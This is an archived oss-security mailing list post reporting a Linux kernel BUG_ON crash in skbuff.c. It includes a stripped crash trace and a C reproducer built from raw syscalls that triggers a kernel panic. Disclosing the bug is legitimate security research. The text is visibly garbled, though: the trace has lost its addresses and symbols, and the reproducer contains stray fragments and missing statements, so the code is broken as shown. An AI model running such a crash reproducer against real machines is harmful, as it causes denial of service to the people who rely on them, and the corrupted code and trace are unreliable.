  oss-security - BUG_ON crash in linux skbuff.c            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 5 Jul From: Marco Grassi <marco.gra@...il.com> To: oss-security@...ts.openwall.com Subject: BUG_ON crash in linux skbuff.c  Hi,  this program will crash the linux kernel and current master in a voluntary panic() call triggered at a BUG_ON in  kernel BUG at  in a qemu environment with kASAN enabled in a syzkaller-kind setup  ---- crash trace ----  [   kernel BUG at [   invalid opcode: [#1] SMP KASAN [   Modules linked in: [   CPU: 0 PID: Comm: derp2 Not tainted #1 [   Hardware name: QEMU Standard PC + PIIX, BIOS [   task: ti: task.ti: [   RIP:  [   RSP:  EFLAGS: [   RAX: RBX: RCX: [   RDX: RSI: RDI: [   RBP: R08: R09: [   R10: R11: R12: [   R13: R14: R15: [   FS:  [   CS:  DS: ES: CR0: [   CR2: CR3: CR4: [   DR0: DR1: DR2: [   DR3: DR6: DR7: [   Stack: [    [    [    [   Call Trace: [    <IRQ> [    [    [    [    [    [    ? [    ? [    ? [    [    [    ? [    ? [    ? [    ? [    [    ? [    ? [    ? [    [    [    [    ? [    ? [    ? [    [    [    <EOI> [    [    [    [    ? [    ? [    ? [    ? [    ? [    [    ? [    [    ? [    ? [    [    [    [    [    ? [    ? [    [    ? [    ? [    ? [    ? [    ? [    ? [    ? [    [    ? [    [    [    ? [    ? [    ? [    [    ? [    ? [    ? [    [    [    ? [    ? [    [   Code: fc ff df 48 89 fa 48 c1 ea 03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e ba 00 00 00 80 a3 91 00 00 00 f9 e9 4a ff ff ff e8 b4 fe a4 fe <0f> 0b e8 ad fe a4 fe 0f 0b e8 a6 fe a4 fe 31 d2 4c 89 ff 44 89 [   RIP  [    RSP [   ---[ end trace ]--- [   Kernel panic - not syncing: Fatal exception in interrupt [   Kernel Offset: disabled [   ---[ end Kernel panic - not syncing: Fatal exception in interrupt  --- reproducer --- derp2.c ---- gcc derp2.c -o derp2  #include <unistd.h> #include <sys/syscall.h> #include <string.h> #include <stdint.h> #include <pthread.h>  #ifndef SYS_mmap #define SYS_mmap 9 #endif #ifndef SYS_socket #define SYS_socket 41 #endif #ifndef SYS_bind #define SYS_bind 49 #endif #ifndef SYS_sendto #define SYS_sendto 44 #endif #ifndef SYS_setsockopt #define SYS_setsockopt 54 #endif #ifndef SYS_dup #define SYS_dup 32 #endif #ifndef SYS_write #define SYS_write 1 #endif  long r[22];  int main() { memset(r, -1, sizeof(r)); r[0] = syscall(SYS_mmap, 0x3ul, 0xfffffffffffffffful, 0x0ul); r[1] = syscall(SYS_socket, 0xaul, 0x2ul, 0x0ul, 0, 0, 0); r[3] = syscall(SYS_bind, r[1], 0, 0, 0); 28); r[6] = syscall(SYS_sendto, r[1], 0xa6ul, 0x1cul); = = = = = = r[13] = syscall(SYS_setsockopt, r[1], 0x1ul, 0x1aul, 0); r[14] = syscall(SYS_dup, r[1], 0, 0, 0, 0, 0); = = = = = = r[21] = syscall(SYS_write, r[14], 0, 0, 0); return 0; }  ----  thank you  Marco  https://marcograss.github.io   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      